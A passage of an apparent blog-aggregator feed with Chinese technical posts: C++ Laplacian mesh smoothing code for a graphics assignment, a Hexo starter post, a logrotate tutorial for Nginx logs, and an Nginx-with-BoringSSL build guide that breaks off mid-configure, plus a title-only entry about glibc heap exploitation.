title="task4"></a>task4</h2><blockquote><p>实现一种简单的三角网格去噪算法（例如拉普拉斯光顺）；30分</p></blockquote><p>此函数声明为：void Laplacian_Smoothing();//////////////////实现一种三角网格去噪算法<br>Tips: 可以参照已经实现的两个去噪算法；按键盘上”b”可以查看去噪结果。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Laplacian_Smoothing()&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/////请实现自己的去噪算法////////</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input laplacian vertex update iterations(5-30次): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"由于迭代，比较耗时！"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] /= j;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ = updateVertexPosition[i];</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of laplacian vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：<br>去噪前<img src="https://qiniu.karlrixon.cn/blog/181029/kagkgc82Eb.png?imageslim" alt="mark">去噪后<img src="https://qiniu.karlrixon.cn/blog/181029/b8ED4jA0lE.png?imageslim" alt="mark"></p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><blockquote><p>（可选/可做可不做）实现一种基于三角网格的操作（例如，特征提取，三角网格分割，三角网格变形等等）；20分</p></blockquote><p>此函数声明为: void mesh_process();</p><p>思路：先求出一个点的一环邻接顶点，将每个点到该顶点的向量相加，将算得的向量加到该点原坐标上得到新坐标。步骤是先计算每个点的新坐标，存储到容器，然后统一修改程序中mesh的顶点数据。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:mesh_process()&#123;<span class="comment">///////(可选，在三角网格上实现一种操作，例如特征提取，网格分割，三角网格变形等等)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input sharpening vertex update iterations(1-30次): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"由于迭代，比较耗时！"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] -= coord(vertex_handle(hh))*j;</span><br><span class="line">      updateVertexPosition[i] *= <span class="number">-1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ += updateVertexPosition[i]*<span class="number">0.1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of sharpening vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>原始图形<img src="https://qiniu.karlrixon.cn/blog/181029/D4LKhgkkdi.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/eE8bBdcl4L.png?imageslim" alt="mark"><br>去噪后<img src="https://qiniu.karlrixon.cn/blog/181109/3b9c2im837.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/6ll9hEAIHb.png?imageslim" alt="mark"><br>变形后<img src="https://qiniu.karlrixon.cn/blog/181109/f476cgEAhE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/74jl6gbh05.png?imageslim" alt="mark"></p><h2 id="思路总结-amp-遇到的问题"><a href="#思路总结-amp-遇到的问题" class="headerlink" title="思路总结&amp;遇到的问题"></a>思路总结&amp;遇到的问题</h2><p>task1中海伦公式注意p表示半周长</p><p>task2中的计算顶点法向的思想是将相邻的所有面片法向相加</p><p>task3使用面片迭代器，调用函数算出三角形中心和法向，使用 <code>glBegin(LINES)</code>画线</p><p>task4要首先算出所有点在一环邻接顶点作用下的正确位置（即邻接顶点相加除以邻接顶点个数），然后统一修改mesh中顶点数据。这里存储所有顶点新位置用到了容器，使用时要注意先给容器分配空间，而且容器下标从0开始，不然会报错容器下标越界</p><p>task5在task4的基础上以另一种方法修改了顶点位置实现一种新的网格变换操作必要时可以自己向内核代码添加一些函数</p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/</id>
        <title><![CDATA[堆利用变迁 Glibc<2.25]]></title>
        <updated>2018-10-25T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"/>
        <content type="text/html" src="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"><![CDATA[堆利用变迁 Glibc<2.25]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/12/03/hello-world/</id>
        <title><![CDATA[Hello World]]></title>
        <updated>2018-02-24T03:48:11+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/12/03/hello-world/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/12/03/hello-world/"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/logrotate.html</id>
        <title><![CDATA[Logrotate 日志滚动 解决日志占用空间过大]]></title>
        <updated>2017-05-03T16:23:04+08:00</updated>
        <link href="https://www.noisyfox.io/logrotate.html"/>
        <content type="text/html" src="https://www.noisyfox.io/logrotate.html"><![CDATA[<h1>起因</h1>
<p>前几天发现自己的博客没有办法登录了，每次输完密码登录完都会重新跳回登录界面。一开始是怀疑登录的session出了什么问题，因为浏览器开隐身模式后就能登录进去。然而开隐身模式进后台的时候又会出现403错误，于是打算连进数据库把session删除再试试。</p>
<p>然而当我试图连接数据库时却一直提示失败，于是试图重启数据库服务，但是系统提示启动失败。电脑坏了怎么办？重启大法！然而数据库服务依旧无法启动，当时我也是摸不着头脑。明明以前一直好好的服务器怎么说炸就炸呢？</p>
<h1>真相</h1>
<p>后来我机智的看了下磁盘的占用情况：</p>
<pre class="brush: bash; title: ; notranslate">df -hl</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png"><img loading="lazy" class="aligncenter size-full wp-image-483" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png" alt="df -hl" width="543" height="152" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl.png 543w, https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl-300x84.png 300w" sizes="(max-width: 543px) 100vw, 543px" /></a></p>
<p>然后我就震惊了！！<span style="color: #000000;"><del>震惊！过气博主硬盘为何被榨干！这背后究竟是人性的&#8230;（啪</del></span></p>
<p>经过一番折腾，终于找到了问题的所在：</p>
<pre class="brush: bash; title: ; notranslate">du -sh .</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png"><img loading="lazy" class="aligncenter size-full wp-image-484" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png" alt="df -hl" width="481" height="96" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh.png 481w, https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh-300x60.png 300w" sizes="(max-width: 481px) 100vw, 481px" /></a></p>
<p>Nginx 的日志文件居然占用了14G的空间！Why？</p>
<h1>论日志</h1>
<p>日志文件通常情况下是未压缩的明文文本文件，在一个运行时间较长的系统中日志文件的体积会越来越大，甚至远超你的预期。</p>
<p>默认情况下一个服务的同一个日志流（如 Nginx 默认就有 error.log access.log 两个日志流）是输出到同一个日志文件中的，也就是说随着时间的推移，这一日志文件中包含的日志的天数也会越来越多，这就给查看某一特定时间段的日志带来了麻烦（试想一下在一个容量10G，包含了一整年数据的日志文件中查找5月份的日志信息，而且还没有日志辅助工具的帮助，是一件多么痛苦的事情）。并且如果日志文件占用了过大的存储空间，那么人们通常会优先删除最老的日志，保留最近一段时间的日志。如果所有日志信息都储存在同一个文件中，那么想要只删除部分数据也不是一件轻松的活。</p>
<p>再者，日志数据通常都是纯文本数据，并且内容重复度非常之高，如果能够将其压缩存储，那么会大大减小体积。然而日志系统是没有办法将数据追加到一个压缩过的日志文件中去的。如果要压缩日志，那么势必需要将日志数据划分成新、旧两部分，其中旧日志压缩后单独存放，新日志即是当前系统活动的日志文件，仍然是纯文本形式。</p>
<p>综上所述，一个好的日志系统至少需要满足以下几个需求：</p>
<ul>
<li>能够将日志按一定规律拆分成多个文件</li>
<li>能够将非活动的日志压缩</li>
<li>能够控制日志文件体积和数量，当条件满足时自动删除旧日志以释放空间</li>
<li>日志文件名满足一定规律便于排序和筛选</li>
</ul>
<p>以上的需求，通常称为<strong>日志滚动</strong><del>（必考）</del>。</p>
<h1>日志滚动</h1>
<p>道理我都懂，但是Linux的日志系统没有提供这些功能，总不能每天手动重命名、压缩、清空、删除日志吧？</p>
<p><del>天空一声巨响，英雄闪亮登场！</del>这时候一个叫做 <strong>logrotate</strong> 的程序就派上了用处。</p>
<p>根据使用的系统不同，logrotate的安装方式也不尽相同，有些系统更是自带了 logrotate 并且带有很多默认的配置（比如我所使用的 Ubuntu Server）。</p>
<p>你可以在自己的系统上查看一下 /var/log/ 目录下的日志文件，如果见到了类似“服务名.log.0”、“服务名.log.1”等一大堆具有相同服务名称但是带有后缀序号的日志文件，那么可以99%肯定这个系统已经安装了 logrotate 并且能够工作。</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png"><img loading="lazy" class="aligncenter size-full wp-image-492" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png" alt="logrotate" width="663" height="579" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logs.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logs-300x262.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>如果你的系统没有带logrotate，别担心，百度一下就能装上啦！而且配置巨简单！</p>
<p>在 /etc/logrotate.d/ 目录下（不同系统可能有所区别）通常会有很多配置文件，这些文件的名字通常对应了该文件所管辖的服务（文件名仅仅是便于管理，和实际内容没有必然关联）。</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png"><img loading="lazy" class="aligncenter size-full wp-image-494" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png" alt="logrotate config" width="663" height="435" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg-300x197.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>而这些配置文件的格式非常的简要，如图所示。通常第一行以目标日志文件路径起头，可以使用通配符，而后面的花括号内部则是需要应用于该日志文件的滚动规则。</p>
<p>其中几个常用的规则在这里稍微解释一下，通常就够用了。更详细的规则可以自行查找，不再赘述。</p>
<pre class="brush: bash; title: ; notranslate">

/var/log/nginx/*.log {
    daily  # 滚动频率，每天滚动一次。其它可选项为 hourly weekly monthly yearly
    missingok
    rotate 14  # 最多保留14次滚动，超过则删除最老的日志
    maxsize 100M  # 重要！活动日志的最大尺寸，超过该尺寸则强制滚动一次
    compress  # 重要！压缩不活动的日志，默认使用gzip
    delaycompress
    notifempty  # 如果日志为空则不滚动
    create 0640 www-data adm
    sharedscripts
    prerotate  # 在每次滚动前执行的脚本，通常是通知该服务“我要滚动日志啦！先别生成新日志咯！”
        if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
        run-parts /etc/logrotate.d/httpd-prerotate; \
        fi \
    endscript
    postrotate  # 在滚动完成后执行的脚本，通常是通知该服务“日志滚动完成啦！请把后续日志写到新的活动日志文件中去！”
        invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1
    endscript
}

</pre>
<p>如果发现日志滚动后 nginx 依旧在向 access.log.1 中写入日志，而新创建的 access.log 大小始终是0，那么请将上文中的 postrotate 代码改为：</p>
<pre class="brush: bash; title: ; notranslate">

service nginx rotate &gt;/dev/null 2&gt;&amp;1

</pre>
<h1>划重点</h1>
<p>同学A：慢着！刚刚不是说你服务器跑的 Ubuntu Server 默认启用了 logrotate 么？那么为什么你的硬盘还是被这些日志文件吃了个精光呢？按说一共就保留14份日志，也就只有14天的份，还都是压缩过的，怎么会占用这么多呢？</p>
<p>我：<del>谢尔曼M1，坐！</del></p>
<p>问题来了，这个 logrotate 的默认配置文件，少了 <em>maxsize 100M</em> 这一行，也就是说如果说在第二天的滚动开始前，日志就已经占用了过大的空间，以至于剩余空间不足以储存对应日志的压缩文件（因为得先压缩完才能删除原始文件，于是整个过程所需的最大空间是 <em>原始文件体积+压缩后的体积</em>，毕竟不可能一边压缩一边删除原始文件嘛）的话，整个日志滚动就会失败。而我的实际情况就是 access.log.0 文件占用了13G的空间（剩下的13个压缩后的日志一共才1G不到，完美的体现了压缩的好处），剩余的空间不足以对其进行压缩，于是整个日志滚动彻底失效了。</p>
<p>当然了，理想的情况下，如果能够将其设置成全部日志加起来的体积超过一个临界点（比如日志一共5G）那么就自动删除最老的一份日志，那是坠吼嘀！然而 logrotate 并没有提供这样的整体体积限制的功能，于是只好用一些小技巧。注意这两行：</p>
<pre class="brush: bash; title: ; notranslate">
rotate 14 # 最多保留14次滚动，超过则删除最老的日志
maxsize 100M # 重要！活动日志的最大尺寸，超过该尺寸则强制滚动一次
</pre>
<p>通过限制活动日志的体积（也就是尾号是0或者没有后缀的那个日志文件）和保留日志滚动数量，我们能够限制整体的日志大小，也即不超过 14 * 100M = 1.4G。当然这样的缺点就是如果某一天的日志特别多，那么那一天的日志会被拆分成多个（课外题：自行百度，将日志文件后缀设置为当前的日期时间）。</p>
<h1>总结</h1>
<p>不限制日志体积真是坑啊！</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/logrotate.html">Logrotate 日志滚动 解决日志占用空间过大</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/cecpq1-nginx-boringssl.html</id>
        <title><![CDATA[Use CECPQ1 On Your Website with Nginx & BoringSSL]]></title>
        <updated>2016-09-13T06:38:13+08:00</updated>
        <link href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"/>
        <content type="text/html" src="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"><![CDATA[<h2>Deprecated / 已弃用</h2>
<p>In 2016, the experimental use in Chrome ended and it was planned to disable CECPQ1 in a later Chrome update.</p>
<p>CECPQ1的实验已经结束，目前的chrome stable已经移除了对其的支持。</p>
<hr />
<h2>What is CECPQ1</h2>
<p>CECPQ1 是谷歌提出的一种“<a href="https://en.wikipedia.org/wiki/Post-quantum_cryptography" target="_blank" rel="noopener noreferrer">后量子时代</a>”的密钥交换算法。</p>
<p>所谓的后量子时代算法，大意是说该算法难以被将来可能出现的量子计算机轻易破解。<br />
而目前常用的非对称加密/密钥交换算法的安全性大多依赖于大数分解以及逆推椭圆曲线的难度。而这些问题可能对于量子计算机来说可以轻松解决。故而需要一种新的加密原理来对抗量子计算机的威胁。</p>
<p>当然将来能不能制造出大型的量子计算机并破解现有的加密算法依旧是个未知数。<a href="https://community.letsencrypt.org/t/google-is-experimenting-with-post-quantum-crypto-for-tls/17720" target="_blank" rel="noopener noreferrer">不过谷歌在前段时间开始已经在自己的 chrome 以及服务器上启用了该密钥交换算法</a>，使用 Chrome 54+ 访问谷歌的服务，可以看到类似下图的结果：<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913150853.png"><img loading="lazy" class="aligncenter size-full wp-image-416" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913150853.png" alt="CECPQ1 on Google" width="642" height="401" /></a></p>
<p>其中的“CECPQ1_ECDSA”即表明了其采用了 CECPQ1 密钥交换 + ECDSA 签名算法。</p>
<p>当然纯粹是好玩，我也装修了一下我的小窝，让它也支持了这种厉害的算法~<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913151547.png"><img loading="lazy" class="aligncenter size-full wp-image-418" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913151547.png" alt="CECPQ1 on Noisyfox" width="642" height="401" /></a></p>
<p>不过由于我的证书是 RSA 签名的，故图中采用的是“CECPQ1_RSA”而不是 ECDSA。</p>
<p>如果你也想让自己的网站支持这种算法，那么就跟着狐狸我一步一步来配置你的网站吧~</p>
<hr />
<h2>教程环境</h2>
<ul>
<li>Ubuntu 14.04.4 LTS</li>
<li>nginx-1.10.1</li>
<li>BoringSSL</li>
</ul>
<p>由于目前仅有 BoringSSL 支持 CECPQ1 算法，故我们需要自行采用 BoringSSL 来编译 nginx。</p>
<p>对于 Debian 用户，以及 Ubuntu 14.04 之前的用户，可以采用<a href="https://github.com/ajhaydock/BoringNginx" target="_blank" rel="noopener noreferrer">BoringNginx</a>项目来一键编译、安装。</p>
<p>对于 Ubuntu 14.04 及以后的用户，由于 Ubuntu 采用了 Systemd 替换了 upstart，故 BoringNginx 脚本会出问题。同时 BoringNginx 要求脚本必须在非 root 用户下执行，这对于大部分习惯用 root 用户来配置服务器的用户来说十分不便，故需采用手动编译、安装。</p>
<hr />
<h2>编译 BoringSSL &amp; Nginx</h2>
<p><em>注：该部分教程参考了 Jerry Qu 《<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">使用 BoringSSL 优化 HTTPS 加密算法选择</a>》一文，在此表示感谢。</em></p>
<p>首先建立一个文件夹，并下载 Nginx 和 BoringSSL 源码。</p>
<p>Nginx 从 1.7.4 开始支持 BoringSSL，这里我使用的是最新的稳定版 Nginx：</p>
<pre class="brush: bash; title: ; notranslate">
mkdir nginx &amp;&amp; cd nginx
wget http://nginx.org/download/nginx-1.10.1.tar.gz
tar xzf nginx-1.10.1.tar.gz

git clone https://boringssl.googlesource.com/boringssl
</pre>
<p>现在你的 nginx 文件夹里应该会有这两个子目录：</p>
<pre class="brush: bash; title: ; notranslate">
boringssl/
nginx-1.10.1/
</pre>
<p>接下来还需要做一些准备工作：</p>
<pre class="brush: bash; title: ; notranslate">
# 安装编译 BoringSSL 所需的 Golang 和 cmake
sudo apt-get install golang cmake

# 安装编译 Nginx 所需的工具和依赖库
sudo apt-get install build-essential libpcre3 libpcre3-dev zlib1g-dev

# 忽略编译过程中的 Warning（不加这个，编到一半会因为 Warning 太多无法继续）
export CFLAGS=&quot;-Wno-error&quot;
</pre>
<p>随后编译 BoringSSL：</p>
<pre class="brush: bash; title: ; notranslate">
# 进入 BoringSSL 源码根目录
cd boringssl

# 创建 build 目录并编译，完成后回到 BoringSSL 源码根目录
mkdir build &amp;&amp; cd build &amp;&amp; cmake ../ &amp;&amp; make &amp;&amp; cd ../

# 创建 .openssl 目录，并将库文件和编译后的文件放进去
mkdir -p .openssl/lib &amp;&amp; cd .openssl &amp;&amp; ln -s ../include . &amp;&amp; cd ../
cp build/crypto/libcrypto.a build/ssl/libssl.a .openssl/lib

cd ../
</pre>
<p>然后就可以用 BoringSSL 来编译 Nginx 了：</p>
<pre class="brush: bash; title: ; notranslate">
# 进入 Nginx 源码根目录
cd nginx-1.10.1

# 指定使用 BoringSSL 作为 SSL 库
# 这里的参数比原文要多了许多，是为了兼容采用 apt 安装的 Nginx 的配置
./configure --with-openssl=../boringssl \
--prefix=/usr/share/nginx \
--sbin-path=/usr/sbin/nginx \
--conf-path=/etc/nginx/nginx.conf \
--error-log-path=/var/log/nginx/error.log \
--http-log-path=/var/log/nginx/access.log \
--pid-path=/run/nginx.pid \
--lock-path=/run/lock/subsys/nginx \
--user=www-data \
--group=www-data \
--with-threads \
--with-file-aio \
--with-ipv6 \
--with-http_ssl_module \
--with-http_v2_module \
